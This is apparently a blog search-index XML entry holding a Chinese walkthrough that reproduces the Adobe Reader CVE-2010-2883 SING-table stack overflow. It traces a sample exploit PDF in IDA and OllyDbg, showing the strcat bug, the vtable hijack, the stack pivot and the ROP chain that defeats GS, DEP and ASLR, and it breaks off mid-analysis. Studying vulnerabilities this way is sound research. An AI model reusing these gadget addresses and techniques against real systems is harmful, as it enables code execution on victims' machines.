<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2010-2883漏洞复现</title>
    <link href="/2023/06/17/CVE-2010-2883%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/06/17/CVE-2010-2883%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><h1 id="CVE-2010-2883漏洞复现"><a href="#CVE-2010-2883漏洞复现" class="headerlink" title="CVE-2010-2883漏洞复现"></a>CVE-2010-2883漏洞复现</h1><h2 id="1-所需环境"><a href="#1-所需环境" class="headerlink" title="1.所需环境"></a>1.所需环境</h2><ul><li>受害者所处操作系统：Windows XP SP3(MSDN版)</li><li>虚拟机：VMware workstation</li><li>动态调试：吾爱OllyDbg</li><li>静态调试：IDA pro</li><li>漏洞软件：Adobe Reader(版本号-9.3.4)</li></ul><h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述"></a>2.漏洞描述</h2><p>该漏洞是利用Adobe Reader 和 Acrobat中<code>CoolType.dll</code>库在解析字体文件SING表中存在的栈溢出漏洞，导致的结果就是当用户打开了特制的PDF文件后就可能导致任意代码执行</p><h2 id="3-基础知识们"><a href="#3-基础知识们" class="headerlink" title="3.基础知识们"></a>3.基础知识们</h2><p>本次漏洞是在PDF当中，因此我们需要线了解以下pdf文档的格式，以及其中关键点ttf sing表的格式，首先pdf的格式，下面是盗的图（</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5992036/v2yp86lax8.png?imageView2/2/w/2560/h/7000"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5992036/51k8v42nbp.jpeg?imageView2/2/w/2560/h/7000"></p><ul><li>Header :头部，用来注明版本号</li><li>Body：主体，图片、文字等</li><li>xref tale：交叉引用表，存放所有对象的偏移</li><li>Trailer：文件尾部，以%%EOF结尾</li></ul><p>而ttf文件就是pdf中的字体文件，而TTF中关于SING表的数据结构体TableEntry的结构如下：</p><pre><code class="hljs">typedef struct_SING&#123;    char tag[4]; //标记&quot;SING&quot;    ULONG checkSum;//校验和：0xD9BCC8B5    ULONG offset; //相对文件的偏移：0x0000011C    ULONG length;//数据长度：0x00001DDF&#125;TableEntry;</code></pre><p>而上面是一个定位SING表的引子，接下来是SING表的整体结构<br><img src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e71c003ed4fc389b504ec26a0f.jpg"></p><p>具体数据结构如下：</p><pre><code class="hljs">#ifndef FORMAT_SING_H#define FORMAT_SING_H#define SING_VERSION VERSION(1, 1)#define SING_UNIQUENAMELEN 28#define SING_MD5LEN 16typedef struct&#123;Card16 tableVersionMajor;//Card16,两字节Card16 tableVersionMinor;Card16 glyphletVersion;Card16 permissions;Card16 mainGID;Card16 unitsPerEm;Int16 vertAdvance;Int16 vertOrigin;Card8 uniqueName[SING_UNIQUENAMELEN];Card8 METAMD5[SING_MD5LEN];Card8 nameLength;Card8 *baseGlyphName; /* name array */&#125; SINGTbl;</code></pre><h2 id="4-发现漏洞点"><a href="#4-发现漏洞点" class="headerlink" title="4.发现漏洞点"></a>4.发现漏洞点</h2><p>首先我们找到位于Adobe文件路径下的动态库<br><img src="http://imgsrc.baidu.com/forum/pic/item/32fa828ba61ea8d3a10a50ced20a304e241f58cb.jpg"><br>我们打开IDA，分析<code>CoolType.dll</code>库，查看字符串表<code>SING</code>，然后查看交叉引用，这里若是使用F12找的字符串可能会出问题，因此我们使用ALT + T 组合键来寻找<code>SING</code></p><pre><code class="hljs">text:0803DCF9                               ; __unwind &#123; // loc_8184A54.text:0803DCF9 55                            push    ebp.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4].text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie.text:0803DD09 33 C5                         xor     eax, ebp.text:0803DD0B 89 85 04 01 00 00             mov     [ebp+108h+var_4], eax.text:0803DD11 6A 4C                         push    4Ch.text:0803DD13 B8 54 4A 18 08                mov     eax, offset loc_8184A54.text:0803DD18 E8 B4 A4 00 00                call    __EH_prolog3_catch.text:0803DD18.text:0803DD1D 8B 85 1C 01 00 00             mov     eax, [ebp+108h+arg_C].text:0803DD23 8B BD 10 01 00 00             mov     edi, [ebp+108h+arg_0].text:0803DD29 8B 9D 14 01 00 00             mov     ebx, [ebp+108h+arg_4].text:0803DD2F 89 7D D8                      mov     [ebp+108h+var_130], edi.text:0803DD32 89 45 D0                      mov     [ebp+108h+var_138], eax.text:0803DD35 E8 F2 39 00 00                call    sub_804172C.text:0803DD35.text:0803DD3A 33 F6                         xor     esi, esi                        ; esi清0，之后用于判断值是否为空.text:0803DD3C 83 7F 08 03                   cmp     dword ptr [edi+8], 3.text:0803DD3C.text:0803DD40                               ;   try &#123;.text:0803DD40 89 75 FC                      mov     [ebp+108h+var_10C], esi.text:0803DD43 0F 84 B7 01 00 00             jz      loc_803DF00.text:0803DD43.text:0803DD49 89 75 E4                      mov     [ebp+108h+var_124], esi.text:0803DD4C 89 75 E8                      mov     [ebp+108h+var_120], esi.text:0803DD4F 83 7F 0C 01                   cmp     dword ptr [edi+0Ch], 1.text:0803DD4F                               ;   &#125; // starts at 803DD40.text:0803DD4F.text:0803DD53                               ;   try &#123;.text:0803DD53 C6 45 FC 01                   mov     byte ptr [ebp+108h+var_10C], 1.text:0803DD57 0F 85 4C 01 00 00             jnz     loc_803DEA9.text:0803DD57.text:0803DD5D 68 2C DB 19 08                push    offset aName                    ; &quot;name&quot;.text:0803DD62 57                            push    edi                             ; int.text:0803DD63 8D 4D E4                      lea     ecx, [ebp+108h+var_124].text:0803DD66 C6 45 EF 00                   mov     [ebp+108h+var_119], 0.text:0803DD6A E8 68 3A FE FF                call    sub_80217D7.text:0803DD6A.text:0803DD6F 39 75 E4                      cmp     [ebp+108h+var_124], esi.text:0803DD72 75 69                         jnz     short loc_803DDDD.text:0803DD72.text:0803DD74 68 4C DB 19 08                push    offset aSing                    ; &quot;SING&quot;.text:0803DD79 57                            push    edi                             ; int.text:0803DD7A 8D 4D DC                      lea     ecx, [ebp+108h+var_12C]         ; 指向SING表入口.text:0803DD7D E8 84 3D FE FF                call    sub_8021B06                     ; 处理SING表.text:0803DD7D.text:0803DD82 8B 45 DC                      mov     eax, [ebp+108h+var_12C]         ; SING表入口赋值给eax.text:0803DD85 3B C6                         cmp     eax, esi                        ; 判断表入口是否位空.text:0803DD85                               ;   &#125; // starts at 803DD53.text:0803DD85.text:0803DD87                               ;   try &#123;.text:0803DD87 C6 45 FC 02                   mov     byte ptr [ebp+108h+var_10C], 2.text:0803DD8B 74 37                         jz      short loc_803DDC4               ; 若我们处理的SING表不出差错，这里是不会进行跳转的.text:0803DD8B.text:0803DD8D 8B 08                         mov     ecx, [eax]                      ; 这里传入的是SING表的第一个四字节，这里是1.0版本，也就是00 01 00 00.text:0803DD8F 81 E1 FF FF 00 00             and     ecx, 0FFFFh                     ; 这里进行判断想与，会设置对应eflags标志位.text:0803DD95 74 08                         jz      short loc_803DD9F               ; 由于上一步设置了相应标志位，因此在这里跳转.text:0803DD95.text:0803DD97 81 F9 00 01 00 00             cmp     ecx, 100h.text:0803DD9D 75 21                         jnz     short loc_803DDC0.text:0803DD9D.text:0803DD9F.text:0803DD9F                               loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j.text:0803DD9F 83 C0 10                      add     eax, 10h                        ; eax本来是存放SING表首地址，这里加上0x10偏移指向uniqueName.text:0803DD9F                                                                       ; uniqueName域.text:0803DDA2 50                            push    eax                             ; Source.text:0803DDA3 8D 45 00                      lea     eax, [ebp+108h+Destination]     ; Destination是-0x108,所以这里应该就是普通的lea eax,[ebp].text:0803DDA6 50                            push    eax                             ; Destination.text:0803DDA7 C6 45 00 00                   mov     [ebp+108h+Destination], 0.text:0803DDAB E8 48 3D 13 00                call    strcat                          ; 漏洞点</code></pre><h2 id="5-样本分析（阶段一：栈溢出）"><a href="#5-样本分析（阶段一：栈溢出）" class="headerlink" title="5.样本分析（阶段一：栈溢出）"></a>5.样本分析（阶段一：栈溢出）</h2><p>我们首先获取到对应样本，其为一个pdf，当我们打开此pdf会有个任意命令执行的功能，具体呈现出的效果为打开一个计算器，如下：<br><img src="http://imgsrc.baidu.com/forum/pic/item/6609c93d70cf3bc7f8d2ec269400baa1cc112a2d.jpg"></p><p>然后执行他，会出现一个明显的pdf弹框，但不完全，接下来就会出现计算器<br><img src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03e1b7c272913f8794a5c22628.jpg"></p><p>当然也可以是别的命令，这里仅仅是为了体现效果<br>首先我们打开OD，加载Adobe文件下的AcroRd32可执行文件</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c8c771dded3a3e6709c83d5135.jpg"></p><p>然后我们按下F9来运行程序，这样可以用来加载我们需要的库<br>这里我们先配合之前的IDA静态分析的结果，我们利用ctrl + g进行地址跟踪，然后双击十六进制部分进行断点，至于下断点的位置，有以下三个点，</p><ul><li>首先就是我们讲<code>SING</code>表赋值给eax的那个点(0x803dd82)；</li><li>然后就是执行strcat函数的点(0x803ddab)</li><li>最后就是一个关键漏洞点(0x808b308)，这个点我们之后详细介绍</li></ul><p>此时我们使用OD打开的Adobe Reader打开样本Exploit，然后会断到我们的第三个断电处</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c336800fe025f4c510fd8f9a1fb.jpg"></p><p>该指令是执行eax寄存器保存的地址指向的函数，这里我们可以从右上角的Registers窗口看到eax的值，发现他是在栈上的，此时我们右键点击eax，然后选择Follow in Stack，这样我们的栈窗口看到咱们eax中保存的值所指向的地址是0x80833EF,此刻我们返回IDA，查看该地址所在的函数</p><pre><code class="hljs">size_t *__cdecl sub_80833EF(int a1, int a2, void *a3, size_t *a4)&#123;  size_t *result; // eax  switch ( a2 )  &#123;    case 0:      return (size_t *)sub_8083119(a3, *a4);    case 2:      return (size_t *)sub_80830AE(*a4);    case 3:      result = (size_t *)sub_80828ED(*(_DWORD *)(a1 + 4), 0);      *a4 = (size_t)result;      break;    default:      result = a4;      *a4 = 0;      break;  &#125;  return result;&#125;</code></pre><p>观察这里是一个switch选择语句，看别的师傅博客是说明这里是处理SING表的时候会执行的函数，具体情况我们到下面再来讲解<br>接下来我们再次F9，类似于gdb当中的c，这里会到达我们之前下的第一个断点，这条指令会将我们SING表的首地址传入eax，我们F8单步执行到下一条指令来查看以下EAX的值<br><img src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343f388a7ebd613b07ecb8088b0.jpg"><br>此时我们查看eax指向地址的值，首先右键eax，然后选择follow in dump，接着会再二进制窗口显示我们值指向的地址，这里从我们之前了解到的<code>SING</code>表结构会知道uniquename的地址应该是SING表偏移0x10字节的地方，也就是0x035529a0,可以看到样本中uniqueName字段十分长，然后我们单步执行到<code>push eax</code>，这里是将我们的uniqueName字段的地址压栈</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b2de9c82d158ccbf231c95f05cd8bc3eb0354153.jpg"></p><p>然后我们再次F9运行到第二个断点处，这里即将调用strcat函数，可以看到其目的地址已经在栈上了，目的地址也是指向栈上的一个缓冲区地址，此时我们查看一下目前的目的地址附近的值，我们在栈窗口上ctrl+g，然后输入目的地址0x12e468</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f603d830bc8d7c12b31bb151ed7c.jpg"></p><p>然后我们单步F8步过call strcat指令，由于我们没有对uniquename进行长度检查，这就导致了我们现如今会将其全部拷贝到栈上指定的地址，结果如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/00e93901213fb80e5f23411d73d12f2eb838940d.jpg"></p><p>可以看到我们左边uniqueName字段的值已经赋值到右边栈上0x12e4d8这里了，此时我们再来查看之前0x12E6D0,此时可以看到已经被覆盖为我们所伪造的地址了</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9b8d9e2ef61c8701a08bfb3d.jpg"></p><p>此时我们可以看到旁边注释也是很清楚，返回到icucnv36.4A80CB38，此时我们跳转到该地址来查看一下函数是干啥的，以及我们为啥要修改之前的返回地址为他</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a600c338744ebf8ea5d47f59cf9d72a6159a7c8.jpg"></p><p>根据别的师傅的说法，这里是明显的利用ROP绕过DEP保护的手段，但是由于本人太菜不了解，所以下面来科普一下相关知识</p><hr><h3 id="1-GS保护"><a href="#1-GS保护" class="headerlink" title="1.GS保护"></a>1.GS保护</h3><p>类似于linux上的canary,函数执行前存放在返回值与ebp上（低地址），然后当我们程序执行完毕之后会调用检查函数来判断该值是否与之前相同，因此我们此时就不能通过覆盖ret地址进行ROP链构造了，而是修改栈上保存的某一个函数指针来进行利用</p><p>IDA反汇编可以看到函数开始前会有如下指令：</p><pre><code class="hljs">text:0803DCF9                               ; __unwind &#123; // loc_8184A54.text:0803DCF9 55                            push    ebp.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4].text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie.text:0803DD09 33 C5                         xor     eax, ebp</code></pre><p>结束函数的时候有以下判断</p><pre><code class="hljs">.text:0803DEE1 E8 A9 A2 00 00                call    @__security_check_cookie@4      ; __security_check_cookie(x).text:0803DEE1.text:0803DEE6 81 C5 08 01 00 00             add     ebp, 108h.text:0803DEEC C9                            leave.text:0803DEED C3                            retn</code></pre><h3 id="2-DEP-Data-Excution-Prevention-数据执行保护"><a href="#2-DEP-Data-Excution-Prevention-数据执行保护" class="headerlink" title="2.DEP(Data Excution Prevention)数据执行保护"></a>2.DEP(Data Excution Prevention)数据执行保护</h3><p>类似于Linux上的NX，不知道为啥名字这俩起不一样干嘛，搞得我是新知识点了，艹。所以这里我们可以使用ROP来进行栈迁移进行绕过，我们可以再OD上输入指令alt+m来查看内存情况，类似pwndbg中的vmmap，十分方便（这里插一句我个人还是更喜欢gdb，不知道为啥就对Linux的喜爱更甚Windows）</p><h3 id="3-ALSR"><a href="#3-ALSR" class="headerlink" title="3.ALSR"></a>3.ALSR</h3><p>终于来了个名字一样的了，在加载程序的时候不再使用固定的基址加载，支持ASLR的程序在其PE头中会设置<br><code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code>标识来说明其支持ASLR。例如，如果 icucnv36.dll 开启了 ASLR，那么同一个代码的地址，可能是 0x4A80CB38，也可能是 0x5A80CB38。由于无法知道准确的地址，所以也就无法跳转到想要执行的代码。我们可以通过下面这个小工具来查看对应库中是否开启了ALSR</p><p><a href="http://www.scriptjunkie.us/files/pefinder.zip">http://www.scriptjunkie.us/files/pefinder.zip</a></p><p>用法如下</p><pre><code class="hljs">dir /b /w /s &quot;C:\Program Files\Adobe\*.dll&quot; | pefinder.exe -</code></pre><p>我们之前将对应0x12E6D0的栈地址指向的即将修改的函数指针改成0x4A80CB38,他位于icucnv36下，我们挑选他不是没有理由，因此我们打开cmd执行上述命令来查看哪里没开ALSR,我们可以找到如下信息：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/63d0f703918fa0ecdc5e47c7639759ee3c6ddb5b.jpg"></p><p>而具体绕过是通过堆喷，我们再之后再来介绍</p><hr><p>我们介绍了几个涉及到的保护知识，接下来再继续分析，我们来说上面所打的第三个断点，我们是如何发现该点的呢，这是通过一步一步调试获取所得，所以上面相当于是提前知道这里用来方便理解<br>这里因为我们要执行恶意代码，运行一次恶意代码会影响后续的工作，因此我们此时先保存个虚拟机快照了再接着调试</p><p>我们F8单步到call CoolType.08001243处，下一个断点，然后再次单步步过<br><img src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffcbbc69c78fc014a90f703ea08.jpg"></p><p>发现并没有出现什么问题，此时我们取消上面打的断点，再接下来单步调试，最后单步我们会到达之前的第三个断点处，如下图:</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d009b3de9c82d15881557a7bc50a19d8bd3e4220.jpg"></p><p>理论上如果你填充大量无关数据，是可以找到这条关键漏洞的地址值的，上面图中我也贴心的给出了eax里面保存的函数指针，这里可以看到接下来就会调用上面的0x4A80CB38的汇编指令了</p><p>这里我们重新来看看，为啥跳转到了这个call [eax]指令，我们首先ctrl + F2来重新启动程序，按照之前的步骤我们步到这里，如下图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16cfd1b8abb6deb48f8d5464e1.jpg"></p><p>此时这条指令<code>call CoolType.08016BDE</code>执行后就会跳转到<code>call [eax]</code>,但这是为什么呢，我们步入进去看看，使用F7，进入该函数后，再此单步调试，直到下面这条指令</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5d455ca3e14da81cb38db3df1.jpg"></p><p>执行该call后会跳到<code>call [eax]</code>,但是这又是为啥呢，因此我们再F7跟进看看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d01373f082025aaf30455c01beedab64024f1a80.jpg"></p><p>可以看到这就是函数内部了，上面重点标记的指令将ecx的值赋给了eax，我们查看ecx</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e7f7a823094c8a786c8175c9b.jpg"></p><p>我们可以跟之前一样右键ecx然后选择follow in dump ，然后左下角二进制会出现相应值，我们发现ecx值所指向的是0x081A601C</p><p>我们可以通过右键二进制窗口，选择long–&gt;address，来方便我们用地址形式来查看内存数据，此时我们跳转到0x81A601C看看这里存放的是什么</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e712a338d4fc389b504ec26aa8.jpg"></p><p>可以发现这里存放的很多函数指针，因此不难判断上面的函数地址这是一个虚表指针，我们可以到IDA中查看该虚表内容</p><pre><code class="hljs">.rdata:081A6004 53 74 72 65 61 6D 48 61 6E 64+aStreamhandler db &#39;StreamHandler&#39;,0     ; DATA XREF: .data:off_821D31C↓o.rdata:081A6012 00 00 00 00 00 00             align 8.rdata:081A6018 2C 87 1E 08                   dd offset ??_R4StreamHandler@@6B@       ; const StreamHandler::`RTTI Complete Object Locator&#39;.rdata:081A601C                               ; const StreamHandler::`vftable&#39;.rdata:081A601C 16 B1 08 08                   ??_7StreamHandler@@6B@ dd offset sub_808B116.rdata:081A601C                                                                       ; DATA XREF: sub_801E529-18↑o.rdata:081A601C                                                                       ; sub_808AC54+11↑o.rdata:081A6020 AA B5 08 08                   dd offset sub_808B5AA.rdata:081A6024 62 99 08 08                   dd offset sub_8089962.rdata:081A6028 8C 95 08 08                   dd offset sub_808958C.rdata:081A602C 91 95 08 08                   dd offset nullsub_41.rdata:081A6030 AA B0 08 08                   dd offset nullsub_47.rdata:081A6034 85 AC 08 08                   dd offset sub_808AC85.rdata:081A6038 C7 95 08 08                   dd offset nullsub_37.rdata:081A603C 95 B0 08 08                   dd offset sub_808B095.rdata:081A6040 07 9E 08 08                   dd offset sub_8089E07.rdata:081A6044 6F 99 08 08                   dd offset sub_808996F.rdata:081A6048 A7 94 08 08                   dd offset sub_80894A7.rdata:081A604C ED 95 08 08                   dd offset sub_80895ED.rdata:081A6050 F2 95 08 08                   dd offset sub_80895F2.rdata:081A6054 C5 B0 08 08                   dd offset sub_808B0C5.rdata:081A6058 FC E4 01 08                   dd offset nullsub_48.rdata:081A605C F9 E4 01 08                   dd offset nullsub_49.rdata:081A6060 FF E4 01 08                   dd offset sub_801E4FF.rdata:081A6064 DA 94 08 08                   dd offset sub_80894DA.rdata:081A6068 F7 95 08 08                   dd offset sub_80895F7.rdata:081A606C F8 E4 01 08                   dd offset nullsub_50.rdata:081A6070 04 E5 01 08                   dd offset sub_801E504.rdata:081A6074 70 B0 08 08                   dd offset sub_808B070.rdata:081A6078 8A AC 08 08                   dd offset sub_808AC8A.rdata:081A607C 2F 99 08 08                   dd offset sub_808992F.rdata:081A6080 5B C3 01 08                   dd offset sub_801C35B.rdata:081A6084 34 99 08 08                   dd offset sub_8089934.rdata:081A6088 9B B5 08 08                   dd offset sub_808B59B.rdata:081A608C 37 99 08 08                   dd offset sub_8089937.rdata:081A6090 69 99 08 08                   dd offset nullsub_46.rdata:081A6094 45 9E 08 08                   dd offset sub_8089E45.rdata:081A6098 54 DC 01 08                   dd offset sub_801DC54.rdata:081A609C 45 DF 01 08                   dd offset sub_801DF45.rdata:081A60A0 F0 D5 01 08                   dd offset sub_801D5F0.rdata:081A60A4 0E C3 01 08                   dd offset sub_801C30E.rdata:081A60A8 3B C3 01 08                   dd offset sub_801C33B.rdata:081A60AC 4B C3 01 08                   dd offset sub_801C34B.rdata:081A60B0 1F 99 08 08                   dd offset sub_808991F.rdata:081A60B4 54 59 50 31 00                aTyp1 db &#39;TYP1&#39;,0                       ; DATA XREF: sub_808B116+275↑o</code></pre><p>可以看到此虚表类型为StreamHandler，应该是处理PDF中流对象的类，然后我们查看IDA中目前正在执行的语句（通过OD来看）</p><pre><code class="hljs">.text:0801BB21 55                            push    ebp.text:0801BB22 8B EC                         mov     ebp, esp.text:0801BB24 FF 75 20                      push    [ebp+arg_18].text:0801BB27 8B 4D 08                      mov     ecx, [ebp+StreamHandler].text:0801BB2A FF 75 1C                      push    [ebp+arg_14].text:0801BB2D 8B 01                         mov     eax, [ecx].text:0801BB2F FF 75 18                      push    [ebp+arg_10].text:0801BB32 FF 05 A0 A6 23 08             inc     dword_823A6A0.text:0801BB38 FF 75 14                      push    [ebp+arg_C].text:0801BB3B FF 75 10                      push    [ebp+arg_8].text:0801BB3E FF 75 0C                      push    [ebp+arg_4].text:0801BB41 FF 10                         call    dword ptr [eax]</code></pre><p>IDA 上面一段代码反汇编情况如下：</p><pre><code class="hljs">int __cdecl sub_801BB21(        int (__thiscall ***StreamHandler)(_DWORD, int, int, int, int, int, int),        int a2,        int a3,        int a4,        int a5,        int a6,        int a7)&#123;  int (__thiscall **v7)(_DWORD, int, int, int, int, int, int); // eax  int result; // eax  v7 = *StreamHandler;  ++dword_823A6A0;  result = (*v7)(StreamHandler, a2, a3, a4, a5, a6, a7);  if ( !(_BYTE)result )    --dword_823A6A0;  return result;&#125;</code></pre><p>可以看到该代码段是传递7个参数，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/94cad1c8a786c91721047ff38c3d70cf3ac757f0.jpg"></p><p>可以看到栈上第一个参数就是之前我们ecx保存的值，该值是一个指向一个虚表指针的地址，也就是我们的StreamHandler对象，该代码逆向的大致含义就是运行虚函数指向的第一个函数，也就是0x0808B116,然后其第一个对象就是StreamHandler,我们可以查看该地址二进制附近的数值</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9d82d158ccbf6c81cd6e0122f93eb13532fa409a.jpg"></p><p>可以看到在当初覆盖值的时候，我们会在此处也覆盖掉一个值，这里也就出现了我们一开始的0x12E6D0,也就是之后call [eax]的eax值，此时我们再次OD F7步入0x808B116,然后单步步过</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fb6a8c5bec28224f4a21a4ddb6.jpg"></p><p>然后到达这条语句，可以看到是将edi + 0x3c地址指向的值赋给了eax，而这个edi保存的是之前StreamHandler对象的首地址，加上0x3c就变成了刚刚我们说里面保存0x12E6D0的值，此时这条指令执行完毕，eax中就是该值了，再然后我们单步，你会发现：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3b87e950352ac65c13bc4bb9bef2b21192138aba.jpg"></p><p>哦我的老天爷，这不是咱们之前打的3号断点嘛，这下我们终于知道了为什么最后call eax会是这个值了，然后我们回到断点处，这里我们会调用0x4A80CB38这个函数，我们按下F7进入该函数查看，至此溢出部分分析完毕</p><h2 id="5-样本分析（阶段二：ROP链）"><a href="#5-样本分析（阶段二：ROP链）" class="headerlink" title="5.样本分析（阶段二：ROP链）"></a>5.样本分析（阶段二：ROP链）</h2><p>接着上面继续分析，我们现在运行到了icucnv36.dll中0x4A80CB38这个地址的函数，我们进入查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fc7e9bf81fafa40f4afb054c.jpg"></p><p>这里我们看到是首先将ebp抬了0x794字节（栈从高到低扩展），然后执行leave，熟悉栈迁移的同学可能十分了解他，它实际上的操作相当于<code>mov esp ebp; pop ebp;</code><br>此时指令执行完毕，栈顶应该指向0x0012E4E0（EBP + 0x794 + 4 &#x3D; 0x12DD48 + 0x794 + 4）,下面发现果真如此，然后栈顶指向的指针就会被我们的retn指令调用</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9fc5922ef61c8701a08bfb75.jpg"></p><p>此时可一看到下一条指令我们是执行 0x4A82A714,我们继续跟进，发现这里是简单的pop出栈上的值到达esp，相当于是再次栈迁移了，这里我们之前构造的0x0C0C0C0C是我们常用的堆喷地址，在后面我们会介绍堆喷的原理，目前程序运行情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd2f88c9ec4c24ab18962b372c.jpg"></p><p>执行后，栈迁移到0x0c0c0c0c</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2cf5e0fe9925bc31609b2d521bdf8db1ca137031.jpg"></p><p>然后继续跟进，发现是将0x4A8A0000弹到ecx上，继续跟进，没什么好说的，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c2cec3fdfc039245b8b3cec5c294a4c27c1e25f1.jpg"></p><p>发现是保存eax到刚刚赋值ecx的地址那儿，也就是0x4A8A0000，然后上面的函数ret过后，会再次从栈上弹出值到eax当中</p><pre><code class="hljs">4A801F90    58              pop eax                           ; &lt;&amp;KERNEL32.CreateFileA&gt;4A801F91    C3              retn4A801F92    33C0            xor eax,eax4A801F94    C3              retn4A801F95 &gt;  8B4C24 04       mov ecx,dword ptr ss:[esp+0x4]    ; icucnv36.4A80B6924A801F99    85C9            test ecx,ecx                      ; icucnv36.4A8A0000</code></pre><p>这里弹出的值是<CreateFileA>的符号值，然后我们进入retn，发现是</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16d2b1b5abb6deb48f8d546481.jpg"></p><p>然后我们就是直接jmp [eax]，也就是直接执行<code>kernel32.CreateFileA</code>这个函数，并且此时我们在栈上也已经构造好了参数如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13090813d99854564e93584b92.jpg"></p><p>此时我们步入这个函数查看内部实现情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d2296323a5e032309f79152d2b7.jpg"></p><p>我们移步到右下角这是咱们解析的参数，这个<code>CreateFileA</code>函数的功能是打开某个文件，如果没这个文件就会创建，其名为<code>iso88591</code>,此时我们使用ctrl + F9来执行到返回，然后查看是否创建出了这个文件，他会被创建在桌面上</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f2deb48f8c5494eec5de20d368f5e0fe98257e7f.jpg"></p><p>可以看到我标注的那个文件，确实是<code>iso88591</code>,这里注意如果你windows的隐藏文件夹选项开着那就看不到，记得到控制面板设置一下</p><p>之后我们继续调试，刚刚我们已经返回，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d833c895d143ad4b5cdc690ac7025aafa50f060d.jpg"></p><p>此时eax应该是上面函数的返回值，其为我们刚刚创建的文件句柄，也就是0x33c，然后交换eax和edi，再次步入</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/622762d0f703918f6e9f1300143d269758eec4aa.jpg"></p><p>此时我们会将栈上的8弹给ebx，接着步入</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd5266ac6c12deee18972bd50736b0.jpg"></p><p>可以看到上面的图中我们将edi,也就是之前的文件句柄传给了esp + ebp*2的地址，可以看到ebx为刚刚的8，也就是距离栈顶偏移0x10字节，也就是将0x0c0c0c6c上原来的值0xFFFFFFFF改为文件句柄，也就是0x33c,然后我们ctrl+F9跳转到返回前</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e9b8a80aa0ac2d56284356868.jpg"></p><p>此时再将<code>CreateFileMappingA</code>的函数地址弹到eax，然后步入可以发现是直接执行eax保存的函数地址</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b3b7d0a20cf431add9396df30e36acaf2fdd9814.jpg"></p><p>内部执行情况单步步入之后如下，并且可以发现其中的栈上的函数参数,其中第一个参数就是我们刚刚的文件句柄，第三个参数就是传递的保护措施，可以看到也是可执行可读可写的，因此我们就可以传递shellcode复制到此处执行</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c2fdfc039245d688bae39c6ee1c27d1ed31b2412.jpg"></p><p>执行完毕我们使用ctrl + F9,再次跳转到结尾，发现同之前一样，交换eax和edi，也就是我们创建文件映射的句柄给到了edi</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c870112789c2c627f9e2f0608ff2a.jpg"></p><p>然后同之前上面一样的操作，通过布置好的ROP链来执行<code>MapViewOfFile</code>，我直接掠过这里调试，跟上面两个函数一样，没什么好说的</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/4610b912c8fcc3ceaaf8e0f9d745d688d43f203b.jpg"></p><p>可以看到上面图片中调用<code>MapViewOfFile</code>函数的参数，调用该函数后，会返回该文件对象在内存当中对应的地址<br>该函数返回后如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd403059bfbe48b87d6267ff9d0.jpg"></p><p>其中eax即为我们文件对象在内存中的地址为0x048D0000 </p><p><img 